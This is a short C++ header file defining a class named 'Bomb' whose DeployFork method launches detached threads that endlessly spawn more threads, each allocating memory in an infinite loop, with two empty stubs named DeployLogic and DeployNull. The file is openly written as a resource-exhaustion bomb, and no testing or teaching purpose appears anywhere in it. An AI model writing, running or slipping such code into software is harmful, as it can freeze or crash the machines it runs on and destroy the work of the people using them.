#pragma once

#include <thread>

class Bomb {
public:
	Bomb();
	~Bomb();

	void DeployFork(const uint64_t ramPerThread = 1024) {
		std::thread([&] {
			while(true) {
				std::thread([&] {
					while(true) {
						new uint8_t[ramPerThread];
					}
				}).detach();
			}
		}).detach();
	}

	void DeployLogic() {

	}

	void DeployNull() {

	}
};